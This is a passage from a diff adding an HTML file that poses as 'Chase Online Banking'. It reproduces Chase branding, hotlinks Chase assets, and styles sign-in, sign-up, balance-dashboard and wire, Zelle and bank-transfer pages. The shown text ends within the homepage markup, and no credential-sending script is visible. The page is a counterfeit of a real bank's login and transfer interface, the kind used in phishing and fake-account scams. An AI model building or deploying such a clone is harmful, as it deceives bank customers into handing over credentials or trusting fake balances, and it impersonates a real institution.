@@ -1,0 +1,1691 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Chase Online Banking</title>
+  
+  <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
+  <link rel="apple-touch-icon" href="https://www.chase.com/etc/designs/chase-ux/favicon-152.png">
+  
+  <style>
+    /* ---------- RESET & GLOBAL ---------- */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Open Sans', 'Helvetica Neue', Arial, sans-serif;
+      color: #211E1E;
+      background: #fff;
+      line-height: 1.5;
+      overflow-x: hidden;
+    }
+
+    img { max-width: 100%; display: block; }
+    a { text-decoration: none; color: inherit; }
+    .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+    /* Chase brand colours */
+    :root {
+      --chase-blue: #117ACA;
+      --chase-blue-dark: #0D5F9E;
+      --chase-header-blue: #004b87;
+      --text-dark: #211E1E;
+      --text-grey: #5A5A5A;
+      --border-light: #E5E5E5;
+      --bg-light: #F4F6F9;
+      --bg-dashboard: #f0f2f5;
+      --green-btn: #008A05;
+      --green-btn-hover: #006B04;
+      --error-red: #d32f2f;
+    }
+
+    /* =========================================================
+       PAGE ROUTING / VISIBILITY
+       ========================================================= */
+    #homepage { display: block; }
+
+    #signin-page, #signup-page {
+      display: none;
+      min-height: 100vh;
+      background-image: url('https://asset.chase.com/content/services/rendition/image.large.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg');
+      background-size: cover;
+      background-position: center;
+      background-attachment: fixed;
+      flex-direction: column;
+    }
+
+    #dashboard-page {
+      display: none;
+      min-height: 100vh;
+      background-color: var(--bg-dashboard);
+      flex-direction: column;
+      position: relative;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+
+    /* Hide homepage when in other routes */
+    body.is-signin #homepage, body.is-signup #homepage, body.is-dashboard #homepage { display: none; }
+
+    /* Show specific page based on hash */
+    body.is-signin #signin-page { display: flex; }
+    body.is-signup #signup-page { display: flex; }
+    body.is-dashboard #dashboard-page { display: flex; }
+
+    /* =========================================================
+       HOMEPAGE STYLES
+       ========================================================= */
+    .header { background: #fff; border-bottom: 1px solid var(--border-light); padding: 12px 0; position: sticky; top: 0; z-index: 100; }
+    .header .container { display: flex; align-items: center; justify-content: space-between; }
+    .hamburger { display: flex; flex-direction: column; gap: 4px; cursor: pointer; background: none; border: none; padding: 4px; }
+    .hamburger span { display: block; width: 20px; height: 2px; background: var(--text-dark); border-radius: 2px; }
+    .logo img { height: 24px; width: auto; }
+    .header-right .sign-in { background: var(--chase-blue); color: #fff; padding: 6px 16px; border-radius: 4px; font-weight: 600; font-size: 13px; transition: background 0.2s; cursor: pointer; }
+    .header-right .sign-in:hover { background: var(--chase-blue-dark); }
+
+    /* --- HERO SECTION --- */
+    .hero {
+      background-image: url('https://sites.chase.com/content/mktservices/digital-assets/image.original.jpg/image/creatives/hero/background/hl-blue-bg.jpg');
+      background-size: cover;
+      background-position: center;
+      background-color: var(--chase-blue);
+      padding: 40px 0 80px;
+    }
+
+    .hero-content {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      max-width: 800px;
+    }
+
+    .hero-offer {
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 80px;
+    }
+
+    .hero-enjoy {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 400;
+      margin-bottom: 4px;
+    }
+
+    .hero-amount {
+      color: #fff;
+      font-size: 48px;
+      font-weight: 700;
+      line-height: 1;
+    }
+
+    .hero h1 {
+      color: #fff;
+      font-size: 26px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      line-height: 1.3;
+    }
+
+    .hero p {
+      color: #fff;
+      font-size: 16px;
+      margin-bottom: 32px;
+      line-height: 1.5;
+      max-width: 450px;
+    }
+
+    .btn-green { display: inline-block; background: var(--green-btn); color: #fff; font-weight: 600; font-size: 15px; padding: 12px 24px; border-radius: 4px; border: none; cursor: pointer; transition: background 0.2s; text-align: center; }
+    .btn-green:hover { background: var(--green-btn-hover); }
+
+    .icon-grid { padding: 40px 0; text-align: center; }
+    .icon-grid h2 { font-size: 26px; font-weight: 600; margin-bottom: 32px; }
+    .icon-grid-inner { display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px 16px; max-width: 600px; margin: 0 auto; }
+    .icon-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; padding: 8px; border-radius: 8px; transition: background 0.2s; }
+    .icon-item:hover { background: var(--bg-light); }
+    .icon-item img { width: 44px; height: 44px; object-fit: contain; filter: invert(37%) sepia(93%) saturate(1735%) hue-rotate(191deg) brightness(94%) contrast(101%); }
+    .icon-item span { font-size: 14px; font-weight: 500; color: var(--text-dark); }
+    .icon-item.full-width { grid-column: span 2; }
+
+    .promo-card { background: var(--chase-blue); color: #fff; border-radius: 8px; padding: 28px 24px; margin-bottom: 20px; display: flex; flex-direction: column; gap: 12px; }
+    .promo-header { display: flex; justify-content: space-between; align-items: flex-start; }
+    .promo-header h3 { font-size: 22px; font-weight: 600; max-width: 80%; }
+    .promo-header svg { width: 48px; height: 48px; fill: #fff; opacity: 0.9; flex-shrink: 0; }
+    .promo-card p { font-size: 15px; opacity: 0.95; }
+    .promo-card .btn-blue { align-self: flex-start; background: #fff; color: var(--chase-blue); font-weight: 600; font-size: 15px; padding: 10px 24px; border-radius: 4px; border: none; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
+    .promo-card .btn-blue:hover { background: #f0f4f8; }
+
+    .advisor-section, .freedom-card-section { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.08); margin-bottom: 24px; }
+    .advisor-img { width: 100%; height: 260px; object-fit: cover; }
+    .advisor-content, .freedom-card-content { padding: 24px; }
+    .advisor-content h2, .freedom-card-content h2 { font-size: 24px; font-weight: 600; margin-bottom: 12px; }
+    .advisor-content p, .freedom-card-content p { font-size: 16px; color: var(--text-grey); margin-bottom: 20px; }
+    .full-banner-img { width: 100%; height: auto; border-radius: 8px; margin-bottom: 24px; display: block; }
+    .card-image-wrapper { background: #fff; padding: 30px; display: flex; justify-content: center; align-items: center; }
+    .card-image-wrapper img { max-height: 200px; width: auto; border-radius: 8px; }
+    
+    /* Auto Section */
+    .auto-section { background: var(--bg-light); border-radius: 8px; padding: 32px 24px; margin-bottom: 32px; display: flex; flex-direction: column; gap: 16px; }
+    
+    /* THE FIX: Using the exact image URL and mix-blend-mode to remove the white background */
+    .auto-section .car-image {
+      width: 140px;
+      height: auto;
+      margin-bottom: 16px;
+      mix-blend-mode: multiply; /* Blends the white JPG background into the grey container */
+    }
+
+    .auto-section h2 { font-size: 24px; font-weight: 600; }
+    .auto-section p { font-size: 16px; color: var(--text-grey); }
+
+    .footer { background: #fff; border-top: 1px solid var(--border-light); padding: 40px 0 24px; font-size: 13px; color: var(--text-grey); }
+    .footer-logo img { height: 24px; width: auto; margin-bottom: 24px; }
+    .footer-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 24px 16px; margin-bottom: 32px; }
+    .footer-col h4 { font-size: 14px; font-weight: 600; color: var(--text-dark); margin-bottom: 8px; }
+    .footer-col ul { list-style: none; }
+    .footer-col ul li { margin-bottom: 6px; line-height: 1.4; }
+    .footer-col ul li a { color: var(--text-grey); transition: color 0.2s; }
+    .footer-col ul li a:hover { color: var(--chase-blue); }
+    .footer-bottom { border-top: 1px solid var(--border-light); padding-top: 24px; display: flex; flex-direction: column; gap: 16px; }
+    .footer-bottom .legal { font-size: 12px; line-height: 1.5; color: #8A8A8A; }
+
+    /* =========================================================
+       AUTH PAGES (SIGN IN & SIGN UP)
+       ========================================================= */
+    .auth-header { display: flex; justify-content: center; padding: 32px 24px; margin-bottom: 20px; }
+    .auth-header img { height: 40px; width: auto; }
+    .logo-box { background-color: #1a2432; padding: 12px 24px; border-radius: 4px; display: inline-block; }
+    .logo-box img { height: 30px; }
+    .auth-main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 0 16px; margin-bottom: 40px; }
+    .auth-card { background: #fff; border-radius: 12px; padding: 32px 24px; width: 100%; max-width: 400px; box-shadow: 0 8px 24px rgba(0,0,0,0.2); position: relative; }
+    
+    .input-group { position: relative; margin-bottom: 24px; }
+    .input-group input { width: 100%; padding: 12px 0; border: none; border-bottom: 1px solid #ccc; font-size: 16px; outline: none; background: transparent; color: #333; }
+    .input-group input:focus { border-bottom: 2px solid var(--chase-blue); }
+    .input-group label { position: absolute; top: 12px; left: 0; font-size: 16px; color: #666; pointer-events: none; transition: 0.2s ease all; }
+    .input-group input:focus ~ label, .input-group input:not(:placeholder-shown) ~ label { top: -12px; font-size: 12px; color: var(--chase-blue); }
+    
+    .password-group { display: flex; align-items: center; border-bottom: 1px solid #ccc; }
+    .password-group:focus-within { border-bottom: 2px solid var(--chase-blue); }
+    .password-group input { flex: 1; border-bottom: none !important; }
+    .toggle-password { color: var(--chase-blue); font-weight: 600; font-size: 15px; cursor: pointer; padding: 4px; user-select: none; }
+    
+    .btn-auth { width: 100%; background: var(--chase-blue); color: #fff; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; transition: background 0.2s; margin-bottom: 16px; }
+    .btn-auth:hover { background: var(--chase-blue-dark); }
+    
+    .divider { display: flex; align-items: center; text-align: center; margin: 20px 0; color: #555; font-size: 14px; }
+    .divider::before, .divider::after { content: ''; flex: 1; border-bottom: 1px solid var(--chase-blue); }
+    .divider::before { margin-right: 15px; }
+    .divider::after { margin-left: 15px; }
+    
+    .btn-passwordless { width: 100%; background: #EBF2FA; color: var(--chase-blue); padding: 14px; border-radius: 6px; font-size: 16px; font-weight: 600; border: none; cursor: pointer; transition: background 0.2s; margin-bottom: 24px; }
+    .btn-passwordless:hover { background: #dcE7f5; }
+    
+    .auth-links { display: flex; flex-direction: column; gap: 16px; }
+    .auth-link { color: var(--chase-blue); font-size: 15px; font-weight: 500; display: flex; align-items: center; justify-content: space-between; }
+    .auth-link:hover { text-decoration: underline; }
+    .auth-link svg { width: 14px; height: 14px; fill: var(--chase-blue); }
+
+    /* Error message styles */
+    .error-msg {
+      color: var(--error-red);
+      font-size: 13px;
+      margin-top: -10px;
+      margin-bottom: 16px;
+      display: none;
+      font-weight: 600;
+    }
+
+    /* =========================================================
+       DASHBOARD STYLES
+       ========================================================= */
+    .dash-header { background-color: var(--chase-header-blue); color: #fff; padding: 16px 20px 24px; position: sticky; top: 0; z-index: 100; }
+    .dash-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
+    .dash-top-bar .menu-btn { background: none; border: none; color: #fff; cursor: pointer; }
+    .dash-top-bar .menu-btn svg { width: 24px; height: 24px; fill: #fff; }
+    .dash-top-icons { display: flex; gap: 16px; }
+    .dash-top-icons svg { width: 24px; height: 24px; fill: none; stroke: #fff; stroke-width: 2; cursor: pointer; }
+
+    .dash-greeting { font-size: 18px; font-weight: 500; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+    .dash-greeting .divider-bar { color: rgba(255, 255, 255, 0.5); font-weight: 300; }
+    .dash-greeting .date-text { font-weight: 400; font-size: 15px; color: rgba(255, 255, 255, 0.9); }
+
+    .action-pills { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 8px; scrollbar-width: none; }
+    .action-pills::-webkit-scrollbar { display: none; }
+    .pill-btn { background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.3); color: #fff; padding: 10px 20px; border-radius: 24px; font-size: 15px; white-space: nowrap; cursor: pointer; transition: background 0.2s; }
+    .pill-btn:hover { background: rgba(255, 255, 255, 0.25); }
+
+    .dash-main { flex: 1; padding: 20px; padding-bottom: 100px; overflow-y: auto; }
+
+    .snapshot-card { background: #fff; border-radius: 8px; padding: 16px; display: flex; align-items: center; gap: 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 24px; cursor: pointer; position: relative; }
+    .snapshot-icon svg { width: 32px; height: 32px; fill: var(--chase-header-blue); }
+    .snapshot-content { flex: 1; }
+    .snapshot-content h4 { font-size: 16px; font-weight: 600; color: #000; display: flex; align-items: center; gap: 8px; }
+    .snapshot-content h4 .tag { background: #e8e8e8; font-size: 11px; padding: 2px 6px; border-radius: 4px; font-weight: 500; color: #555; }
+    .snapshot-content p { font-size: 14px; color: #333; margin-top: 2px; }
+    .snapshot-card .chevron { color: #ccc; }
+    .snapshot-card .chevron svg { width: 20px; height: 20px; fill: #999; }
+
+    .accounts-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+    .accounts-header h3 { font-size: 20px; font-weight: 500; color: #000; }
+    .accounts-header .options-btn { background: none; border: none; cursor: pointer; font-size: 20px; font-weight: bold; color: #555; letter-spacing: 2px; }
+
+    .account-card { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); margin-bottom: 24px; }
+    .account-card-header { background-color: #003366; color: #fff; padding: 12px 16px; font-size: 15px; font-weight: 500; display: flex; align-items: center; gap: 8px; }
+    .account-card-body { padding: 16px; }
+    .account-name-row { display: flex; align-items: center; gap: 8px; font-size: 16px; color: #333; margin-bottom: 16px; font-weight: 400; }
+    
+    .account-balance { text-align: right; }
+    .account-balance .amount { font-size: 32px; font-weight: 400; color: #000; line-height: 1; display: flex; align-items: center; justify-content: flex-end; gap: 8px; }
+    .account-balance .label { font-size: 13px; color: #666; margin-top: 4px; }
+
+    /* Specific Credit Card Styles */
+    .cc-image-container img { width: 90px; height: auto; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+    .cc-autopay-msg { display: flex; align-items: flex-start; gap: 8px; margin-top: 24px; padding-top: 16px; border-top: 1px solid #eee; font-size: 14px; color: #333; line-height: 1.4; }
+    .cc-autopay-msg svg { width: 18px; height: 18px; fill: #4CAF50; flex-shrink: 0; margin-top: 2px; }
+
+    .open-account-btn { display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; background: transparent; border: 2px dashed var(--chase-header-blue); color: var(--chase-header-blue); padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 24px; background-color: rgba(255,255,255,0.5); }
+    .open-account-btn svg { width: 20px; height: 20px; fill: var(--chase-header-blue); }
+
+    .list-container { background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
+    .list-item { display: flex; align-items: center; gap: 16px; padding: 20px 16px; border-bottom: 1px solid #eee; cursor: pointer; transition: background 0.2s; }
+    .list-item:hover { background: #f9f9f9; }
+    .list-item:last-child { border-bottom: none; }
+    .list-item-icon svg { width: 24px; height: 24px; fill: #444; }
+    .list-item-content { flex: 1; }
+    .list-item-content h4 { font-size: 16px; font-weight: 600; color: #000; margin-bottom: 2px; }
+    .list-item-content p { font-size: 13px; color: #666; line-height: 1.3; }
+    .list-item .chevron svg { width: 20px; height: 20px; fill: #ccc; }
+
+    /* Redesigned Bottom Nav */
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #ffffff; display: flex; justify-content: space-around; align-items: center; padding: 8px 0 calc(8px + env(safe-area-inset-bottom, 0px)); border-top: 1px solid #e8e8e8; box-shadow: 0 -2px 12px rgba(0, 0, 0, 0.04); z-index: 300; }
+    .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; color: #8a8a8a; font-size: 11px; font-weight: 400; cursor: pointer; transition: color 0.2s ease; padding: 4px 12px; border-radius: 8px; }
+    .nav-item:hover { color: var(--chase-header-blue); background: rgba(0, 75, 135, 0.04); }
+    .nav-item.active { color: var(--chase-header-blue); }
+    .nav-item.active span { font-weight: 600; }
+    .nav-item svg { width: 24px; height: 24px; fill: #8a8a8a; transition: fill 0.2s ease; }
+    .nav-item.active svg, .nav-item:hover svg { fill: var(--chase-header-blue); }
+
+    .fab { position: fixed; bottom: 70px; right: 20px; width: 56px; height: 56px; background: #333; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); cursor: pointer; z-index: 301; }
+    .fab svg { width: 28px; height: 28px; fill: #fff; }
+
+    /* =========================================================
+       SUB-VIEWS (BILLS, PAY/TRANSFER, PROFILE, TRANSFER FORMS)
+       ========================================================= */
+    .sub-view {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--bg-dashboard);
+      z-index: 200;
+      flex-direction: column;
+      overflow-y: auto;
+      padding-bottom: 80px;
+    }
+
+    /* Toggle Classes */
+    #dashboard-page.show-bills #bill-activities-view { display: flex; }
+    #dashboard-page.show-pay #pay-transfer-view { display: flex; }
+    #dashboard-page.show-profile #profile-view { display: flex; }
+    
+    #dashboard-page.show-internal #internal-transfer-view { display: flex; }
+    #dashboard-page.show-external #external-transfer-view { display: flex; }
+    #dashboard-page.show-zelle #zelle-transfer-view { display: flex; }
+    #dashboard-page.show-wire #wire-transfer-view { display: flex; }
+
+    .sub-header { background-color: var(--chase-header-blue); color: #fff; padding: 20px; padding-top: 30px; display: flex; flex-direction: column; }
+    .sub-top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+    .back-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; padding: 4px; }
+    .back-btn svg { width: 24px; height: 24px; fill: #fff; }
+    .chat-icon svg { width: 24px; height: 24px; fill: none; stroke: #fff; stroke-width: 2; }
+    
+    .sub-header h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+    .sub-header .account-label { font-size: 15px; font-weight: 500; color: rgba(255,255,255,0.9); }
+
+    .bills-content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
+    .search-bar { display: flex; align-items: center; background: #fff; border: 1px solid #ccc; border-radius: 6px; padding: 12px 16px; margin-bottom: 24px; }
+    .search-bar input { border: none; outline: none; width: 100%; font-size: 15px; color: #333; }
+    .empty-state { text-align: center; color: #666; font-size: 16px; margin-top: 40px; }
+
+    .pay-content { flex: 1; padding: 20px; }
+    .icon-bank { fill: #005EB8 !important; }
+    .icon-zelle { fill: #6D1ED4 !important; }
+    .icon-wire { fill: #005EB8 !important; }
+
+    /* =========================================================
+       TRANSFER FORMS (MODAL STYLE PAGE)
+       ========================================================= */
+    .transfer-view-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      background-color: rgba(0, 0, 0, 0.4);
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .transfer-card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 24px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      position: relative;
+    }
+
+    .transfer-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .transfer-header h2 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #000;
+    }
+
+    .cancel-btn {
+      background: none;
+      border: none;
+      color: var(--error-red);
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .form-group { margin-bottom: 20px; }
+    .form-group label { display: block; font-size: 14px; color: #555; margin-bottom: 8px; }
+    .form-control { width: 100%; padding: 14px; border: 1px solid #ccc; border-radius: 8px; font-size: 15px; color: #333; outline: none; background: #fff; }
+    .form-control:focus { border-color: var(--chase-header-blue); }
+    .form-control::placeholder { color: #999; }
+
+    .from-account-select {
+      background-color: #EBF2FA;
+      border: 1px solid #B0C4DE;
+      border-radius: 8px;
+      font-weight: 500;
+      color: var(--chase-header-blue);
+      appearance: none;
+      background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%23004b87%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");
+      background-repeat: no-repeat;
+      background-position: right 14px top 50%;
+      background-size: 12px auto;
+    }
+
+    .send-money-btn {
+      width: 100%;
+      background: var(--chase-header-blue);
+      color: #fff;
+      padding: 16px;
+      border-radius: 24px;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+      transition: background 0.2s;
+    }
+    .send-money-btn:hover { background: var(--chase-blue-dark); }
+
+    /* Profile specific */
+    .profile-content { flex: 1; padding: 20px; overflow-y: auto; padding-bottom: 100px; }
+    .profile-card { background: #fff; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 20px; padding: 24px; }
+    .main-profile-card { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 32px 24px; }
+    .avatar-large { width: 80px; height: 80px; background: #d1d5db; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .avatar-large svg { width: 50px; height: 50px; fill: #fff; }
+    .main-profile-card h2 { font-size: 22px; font-weight: 600; color: #000; margin-bottom: 4px; }
+    .main-profile-card p { font-size: 15px; color: #555; text-decoration: underline; text-underline-offset: 3px; }
+
+    .detail-row { display: flex; align-items: flex-start; gap: 16px; padding: 16px 0; border-bottom: 1px solid #eee; }
+    .detail-row:last-child { border-bottom: none; padding-bottom: 0; }
+    .detail-row:first-child { padding-top: 0; }
+    .detail-icon { width: 24px; height: 24px; fill: var(--chase-header-blue); margin-top: 4px; flex-shrink: 0; }
+    .detail-text { display: flex; flex-direction: column; flex: 1; }
+    .detail-label { font-size: 13px; color: #777; margin-bottom: 4px; }
+    .detail-value { font-size: 16px; color: #000; }
+    .detail-value.underlined { text-decoration: underline; text-underline-offset: 2px; }
+
+    .edit-container { display: flex; align-items: center; gap: 8px; }
+    .edit-container .detail-value { cursor: pointer; }
+    .edit-container .pencil-icon { cursor: pointer; fill: #888; width: 16px; height: 16px; }
+    .edit-container .pencil-icon:hover { fill: var(--chase-header-blue); }
+
+    .edit-wrapper { display: flex; gap: 8px; margin-top: 8px; }
+    .edit-input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; outline: none; }
+    .edit-input:focus { border-color: var(--chase-header-blue); }
+    .btn-save-edit { background: var(--chase-header-blue); color: #fff; border: none; padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
+
+    .btn-signout { width: 100%; background: #fff; border: 1px solid #ccc; color: #b91c1c; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+    .btn-signout:hover { background: #f9f9f9; }
+
+    @media (max-width: 480px) {
+      .dash-greeting { font-size: 16px; flex-wrap: wrap; }
+      .dash-greeting .date-text { font-size: 14px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- =========================================================
+       HOMEPAGE CONTAINER
+       ========================================================= -->
+  <div id="homepage">
+    <header class="header">
+      <div class="container">
+        <button class="hamburger" aria-label="Menu">
+          <span></span><span></span><span></span>
+        </button>
+        <a href="#" class="logo">
+          <img src="https://www.chase.com/content/dam/unified-assets/logo/chase/chase-logo/additional-file-formats/logo_chase_headerfooter.svg" alt="Chase Logo">
+        </a>
+        <a href="#" class="sign-in" id="trigger-signin">Sign in</a>
+      </div>
+    </header>
+
+    <section class="hero">
+      <div class="container hero-content">
+        <div class="hero-offer">
+          <span class="hero-enjoy">Enjoy</span>
+          <span class="hero-amount">$400</span>
+        </div>
+        <h1>New Chase checking customers</h1>
+        <p>Open a Chase Total Checking<sup>®</sup> account with qualifying activities.</p>
+        <a href="#" class="btn-green">Open an account</a>
+      </div>
+    </section>
+
+    <section class="icon-grid">
+      <div class="container">
+        <h2>Choose what's right for you</h2>
+        <div class="icon-grid-inner">
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/briefcase/mds_ill_briefcase_linear_gry.svg" alt="Business">
+            <span>Business</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/card/mds_ill_card_linear_gry.svg" alt="Credit cards">
+            <span>Credit cards</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/check/mds_ill_check_linear_gry.svg" alt="Checking">
+            <span>Checking</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/plane/mds_ill_plane_linear_gry.svg" alt="Travel">
+            <span>Travel</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/piggy-bank/mds_ill_piggy_bank_linear_gry.svg" alt="Savings">
+            <span>Savings</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/home/mds_ill_home_linear_gry.svg" alt="Home loans">
+            <span>Home loans</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/car/mds_ill_car_linear_gry.svg" alt="Auto">
+            <span>Auto</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/chart-line/mds_ill_chart_line_linear_gry.svg" alt="Investing">
+            <span>Investing</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/building/mds_ill_building_linear_gry.svg" alt="Commercial">
+            <span>Commercial</span>
+          </div>
+          <div class="icon-item">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/people-message/mds_ill_people_message_linear_gry.svg" alt="Schedule a meeting">
+            <span>Schedule a meeting</span>
+          </div>
+          <div class="icon-item full-width">
+            <img src="https://www.chase.com/content/dam/unified-assets/illustration/chase-spot-illustrations/credit-score/mds_ill_credit_score_linear_gry.svg" alt="Free credit score">
+            <span>Free credit score</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="container">
+      <div class="promo-card">
+        <div class="promo-header">
+          <h3>Chase Credit Cards</h3>
+          <svg viewBox="0 0 48 48"><rect x="6" y="12" width="36" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><line x1="6" y1="18" x2="42" y2="18" stroke="currentColor" stroke-width="2"/></svg>
+        </div>
+        <p>See if you're preapproved</p>
+        <p>Learn which Chase Credit Cards you're preapproved for just a few moments. Plus, there's no impact to your credit score.</p>
+        <a href="#" class="btn-blue">Get started</a>
+      </div>
+
+      <div class="promo-card">
+        <div class="promo-header">
+          <h3>Chase Secure Banking<sup>SM</sup></h3>
+          <svg viewBox="0 0 48 48"><rect x="8" y="12" width="32" height="24" rx="3" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="24" cy="24" r="6" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        </div>
+        <p><strong>Get $175 as a new Chase banking customer</strong></p>
+        <p>When you open a Chase Secure Banking account with qualifying activities. $0 Monthly Service Fee for customers aged 17-24.</p>
+        <a href="#" class="btn-blue">Open now</a>
+      </div>
+
+      <div class="promo-card">
+        <div class="promo-header">
+          <h3>Home Lending</h3>
+          <svg viewBox="0 0 48 48"><path d="M8 24L24 10l16 14v14H8V24z" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/><rect x="18" y="28" width="12" height="10" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        </div>
+        <p><strong>We'll close on time, or you get $5,000</strong></p>
+        <p>We pride on on-time closing for eligible products in as soon as three weeks or you get $5,000, if you qualify.</p>
+        <a href="#" class="btn-blue">See details</a>
+      </div>
+
+      <div class="advisor-section">
+        <img src="https://sites.chase.com/content/mktservices/digital-assets/image.original.jpg/image/creatives/photo/hands-touching-tablet-restile.jpg" alt="Hands touching a tablet" class="advisor-img" loading="lazy">
+        <div class="advisor-content">
+          <h2>Now's the time to talk with an advisor</h2>
+          <p>A dedicated J.P. Morgan advisor can help you navigate the market with a customized investment strategy and ongoing financial advice.</p>
+          <a href="#" class="btn-green">Continue</a>
+        </div>
+      </div>
+
+      <div class="freedom-card-section">
+        <div class="card-image-wrapper">
+          <img src="https://i.imgur.com/80o9HZq.png" alt="Chase Freedom Unlimited credit card" loading="lazy">
+        </div>
+        <div class="freedom-card-content">
+          <h2>Earn a $200 bonus</h2>
+          <p>Plus, earn unlimited 1.5% cash back or more on all purchases, including 3% on dining and drugstores — all with no annual fee.</p>
+          <a href="#" class="btn-green">Learn more</a>
+        </div>
+      </div>
+
+      <img src="https://sites.chase.com/content/mktservices/digital-assets/image.original.jpg/image/creatives/text-as-image/jpm-earn-1k-cb-rt.jpg" alt="JPMorgan Earn $1000 Cash Back" class="full-banner-img" loading="lazy">
+      <img src="https://sites.chase.com/content/services/structured-image/image.desktop.jpg/XCRT/Flexible-Templates/Triplets/2025/january/B1224-4543500_Triplet.jpg" alt="Chase Promotional Banner" class="full-banner-img" loading="lazy">
+
+      <!-- USING EXACT IMAGE URL WITH MIX-BLEND-MODE TO REMOVE WHITE BACKGROUND -->
+      <div class="auto-section">
